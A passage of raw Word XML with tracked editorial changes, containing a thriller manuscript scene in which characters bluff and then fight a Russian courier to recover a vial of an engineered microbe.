          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>a weapon, Danny recognized that it was the latter that was actually keeping him at bay.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with the Federal Emergency Management Agency’s biological alert response team. This building is a registered Class Seven research facility, with instant alarms wired directly to Bellevue regional headquarters.” Danny knew he was a terrible actor. Jason and Moshen were feeding him lines through his cellphone. He was doing his best to deliver them as believably as he could.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eyed Danny warily. “You are some kind of cop? Do you have a badge?”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“I’m a FEMA contractor,” said Danny. “I’m patched in to the Bellevue Police Department on the radio right now. We have patrol units stationed around the </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>building.” Noting the Russian’s look of incredulity, he added, “There’s a window in the conference room behind you. Go ahead. Take a look.”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cautiously backed up several feet until he could see outside. In the dark of night, through the needles of the pine trees that lined the building, flashed the distinct red</w:t>
      </w:r>
      <w:ins w:id="1239" w:author="TextVet" w:date="2016-03-17T15:48:00Z">
        <w:r w:rsidR="00E04845">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1240" w:author="TextVet" w:date="2016-03-17T15:48:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00E04845">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and</w:t>
      </w:r>
      <w:ins w:id="1241" w:author="TextVet" w:date="2016-03-17T15:48:00Z">
        <w:r w:rsidR="00E04845">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1242" w:author="TextVet" w:date="2016-03-17T15:48:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00E04845">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blue strobe of a police light. “Fucking shit!” he spat.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“Several minutes ago</w:t>
      </w:r>
      <w:ins w:id="1243" w:author="TextVet" w:date="2016-03-17T15:48:00Z">
        <w:r w:rsidR="00314B2E">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we received an alarm indicating a breach of containment of potentially infectious pathogenic microbiations. According to the readings on this interferometric biocontamination detector kit, you’ve been exposed to dangerous levels of organic couplings. Biohazard containment protocol requires that I get you to a decontamination facility immediately.”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got some kind of alarm?” the Russian asked tensely.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signal was an automatic response to an unscheduled access to the cryogenic containment machinery,” Danny said. “Do you know of any recent activity involving the freezer equipment?”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know nothing,” said the man. “I am just nighttime delivery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“Are you alone here inside this facility?”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said the Russian. “Yes, I am.”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0095235C" w:rsidRDefault="000D3488" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:ins w:id="1244" w:author="TextVet" w:date="2016-03-17T15:49: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immediately looked past Danny with an angry glare as a beam of light swept the hallway.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over his shoulder.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he’s not,” said the girl.</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“I’m sorry. The, um, alarm is my fault.</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> I forgot to deactivate the nightly security.”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saw the man who was spewing technobabble. He was slender and moderately tall, with jeans and hiking boots poking out beneath an ill-fitting white lab coat. His floppy, curly brown hair was overdue for a cut. He moved and spoke with youthful energy, but the cracking of the skin near his eyes and subtle gray streaks on his temples betrayed the march of advancing years.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couldn’t see his mouth through the surgical mask, but his eyes radiated gratitude.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She also saw something that the Russian apparently couldn’t: a large dark red blot on the back of the white lab coat. The man’s left shoulder was matted with blood.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you tell us about the nature of the contaminants?” he asked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went to stand by his side, so that he wouldn’t be at risk of revealing his injured shoulder. “They’re an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strain with plasmid enhancements of indeterminate nature. They’re being transported in an Eppendorf vial.” That part, at least, was true.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listened to his cellphone. Finally, he asked, “What is the location of this vial?”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thought for a second, and answered, “It’s enclosed in the port-side extremity.”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stood close enough to hear several tinny voices in the man’s phone. “Oh! It’s in the Russian dude’s hand!” “Which one?” “Port side. Which side is port?” “Left if you’re facing stern.” “Are you sure?” “I own a yacht. I know which way is port.” “So is it the Russian’s left or Danny’s left?” “It’s the left side if you’re facing the front of the building.” “What?” “That’s how it works on a boat…”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While the voices chattered, Tina spotted movement behind the Russian. A large scruffy man, overweight but agile, moved slowly through the darkness. He appeared to be holding a weapon of some kind. He saw her looking at him, and brought a finger to his lips.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“Listen,” Tina </w:t>
      </w:r>
      <w:ins w:id="1245" w:author="TextVet" w:date="2016-03-17T15:52:00Z">
        <w:r w:rsidR="00C877F1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>told</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1246" w:author="TextVet" w:date="2016-03-17T15:52:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00C877F1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>said to</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the geeky guy in the lab coat. “I am aware of the present need for complex communication protocols, owing to the proximity of non-native personnel. And while I’m uncertain about the exact cause of your arrival at this facility, it’s clear to me that your relationship to law enforcement suffers from a complete lack of existence. Now, are you aware of the presence of clandestine personnel to the posterior of the non-native agent?”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“Affirmative,” the man responded. “That would be Agent Bravo. He’s on standby pending physical altercation. However, that would be a scenario best avoided.”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“Agreed,” Tina said. “Immediate departure would be advisable.”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go ahead. For me, retrieval of contaminant is imperative.”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Tina’s jaw dropped. “Have you lost all function in your cerebral cortex?”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="008C4707" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1247" w:author="TextVet" w:date="2016-03-17T15:54:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">His </w:t>
        </w:r>
        <w:r w:rsidR="00766F8D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">eyes </w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>narrowing, the</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1248" w:author="TextVet" w:date="2016-03-17T15:53:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="008C4707">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>The</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Russian watched them talk</w:t>
      </w:r>
      <w:del w:id="1249" w:author="TextVet" w:date="2016-03-17T15:54:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="008C4707">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> with narrowing eyes</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488"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geeky guy turned to the Russian and said, “Sir, are you currently carrying a vial of potentially infectious agents on your person?”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shot Tina a murderous glare. “Did she tell you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sir. It’s simply the only way to explain the amplitude of these readings.” He waved his instrument at the Russian. Tina thought the strange device looked like a mad combination of high-tech art and parts scavenged from Radio Shack. She could clearly see, though, that he wasn’t getting any “readings” from the machine. It had no display.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fuck are you doing with that thing?” </w:t>
      </w:r>
      <w:ins w:id="1250" w:author="TextVet" w:date="2016-03-17T15:55:00Z">
        <w:r w:rsidR="003D370D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>demand</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1251" w:author="TextVet" w:date="2016-03-17T15:55:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="003D370D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>ask</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ed the Russian.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“Sir, please show me what’s in your hands,” ordered the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is nothing in my hands,” the Russian asserted.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00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="1252" w:author="TextVet" w:date="2016-03-17T15:56:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>These</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> readings say otherwise,” the geek </w:t>
      </w:r>
      <w:ins w:id="1253" w:author="TextVet" w:date="2016-03-17T15:55:00Z">
        <w:r w:rsidR="005636D9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>assured</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1254" w:author="TextVet" w:date="2016-03-17T15:55:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="005636D9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>said emphatically</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doubt that,” replied the Russian.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do you mean?” said the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slowly said, “Let me see these readings.”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nervously replied, “It takes a great deal of training to interpret the status of the indicator lamps on this interferometric biodetector.”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All signs of tension and apprehension left the Russian’s face. He stared at the geek with smoldering contempt. “As much training as it takes to engage in complex communication protocols to fool non-native personnel?”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geek gulped.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are both assholes,” the Russian said slowly. “You think because I have accent that I don’t understand things? Fuck you both, you smart-ass pieces of shit. Let me tell you something. Trying to get in on my action, keep me from doing my job? I understand. It’s nothing personal. But insulting my intelligence? That is something I do not forgive.”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“Agent Bravo!” the geek shouted. “Prepare for engagement!” He pulled off his surgical mask. His face was focused, calculating.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saw the burly man in the hallway crouch</w:t>
      </w:r>
      <w:ins w:id="1255" w:author="TextVet" w:date="2016-03-17T15:57:00Z">
        <w:r w:rsidR="0022706E">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ready to pounce.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“Cut the crap already,” the Russian ordered. “I don’t know who you are talking to, and I don’t know why there is cop car outside that window. But I </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>do</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> know you are </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>completely full of shit.” The Russian held out his left hand and, from his gloved fist, produced the vial. “I will not waste bullet on you. You want this? Come get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geeky man remained resolute. He put his cellphone in his pocket, flexed, and backed up several paces. He raised his machine with both hands like a giant club.</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laughed, turned his torso sideways, and drew his fist up near his hip in a ready posture. He placed his feet shoulder-width apart with slightly bent knees, and beckoned for his opponent to attack.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="002513B8" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1256" w:author="TextVet" w:date="2016-03-18T14:21:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:smallCaps/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Roaring, his veins hosing lava</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1257" w:author="TextVet" w:date="2016-03-18T14:21:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="002513B8">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:smallCaps/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>With a mighty battle cry</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:smallCaps/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> Danny rushed headlong at the Russian.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kept his eye on him, evaluating his trajectory, judging his center of mass.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he was caught completely off-guard when the lug wrench smashed against the back of his skull with the full force of Mike’s charge from behind.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Tina squealed.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the Russian reeled in pain, Danny swung his machine like a baseball bat at the man’s torso. The heavy pack of ultracapacitors hit the Russian in the chest, knocking the air out of his lungs and sending him stumbling sideways. The Eppendorf tube fell to the carpet</w:t>
      </w:r>
      <w:del w:id="1258" w:author="TextVet" w:date="2016-03-18T14:23:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00C95D78">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>ed floor</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tried to scramble for the vial</w:t>
      </w:r>
      <w:ins w:id="1259" w:author="TextVet" w:date="2016-03-18T14:24:00Z">
        <w:r w:rsidR="00A05B36">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>.</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1260" w:author="TextVet" w:date="2016-03-18T14:24:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00A05B36">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del w:id="1261" w:author="TextVet" w:date="2016-03-18T14:24:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00A05B36">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">but </w:delText>
        </w:r>
        <w:r w:rsidRPr="000D3488" w:rsidDel="00054676">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">to his surprise he </w:delText>
        </w:r>
        <w:r w:rsidRPr="000D3488" w:rsidDel="00A05B36">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>fou</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1262" w:author="TextVet" w:date="2016-03-18T14:24:00Z">
        <w:r w:rsidR="00A05B36">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Fi</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>nd</w:t>
      </w:r>
      <w:ins w:id="1263" w:author="TextVet" w:date="2016-03-18T14:24:00Z">
        <w:r w:rsidR="00A05B36">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himself hopelessly winded from the attack</w:t>
      </w:r>
      <w:ins w:id="1264" w:author="TextVet" w:date="2016-03-18T14:25:00Z">
        <w:r w:rsidR="001924AF">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1265" w:author="TextVet" w:date="2016-03-18T14:25:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="001924AF">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266" w:author="TextVet" w:date="2016-03-18T14:25:00Z">
        <w:r w:rsidR="001924AF">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>h</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1267" w:author="TextVet" w:date="2016-03-18T14:25:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="001924AF">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>H</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e took a few breathless steps.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dashed for it. She plucked the tube from the floor and put it in her pocket.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then half-saw, half-felt her run up beside him. Oddly, she seemed taller than him. She put his arm over her shoulders and helped him stand back up. He had fallen to one knee without even realizing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“You’ve got to get out of here,” she told him. The pressure of her body felt reassuring.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shook his head and looked gravely at Mike and the Russian.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="00D76158" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1268" w:author="TextVet" w:date="2016-03-18T14:26:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Dazed, t</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1269" w:author="TextVet" w:date="2016-03-18T14:26:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00D76158">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>T</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>he Russian</w:t>
      </w:r>
      <w:del w:id="1270" w:author="TextVet" w:date="2016-03-18T14:26:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00D76158">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>, dizzy from the blows,</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> swung </w:t>
      </w:r>
      <w:del w:id="1271" w:author="TextVet" w:date="2016-03-18T14:26:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00D76158">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">blindly </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>outward</w:t>
      </w:r>
      <w:ins w:id="1272" w:author="TextVet" w:date="2016-03-18T14:26:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>, rage blind</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> as he turned to face his attacker.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attempted to </w:t>
      </w:r>
      <w:ins w:id="1273" w:author="TextVet" w:date="2016-03-18T14:27:00Z">
        <w:r w:rsidR="007B027B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>piston</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1274" w:author="TextVet" w:date="2016-03-18T14:27:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="007B027B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>crash</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the lug wrench down on his head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The Russian parried </w:t>
      </w:r>
      <w:del w:id="1275" w:author="TextVet" w:date="2016-03-18T14:27:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="009A3FC6">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">Mike’s </w:delText>
        </w:r>
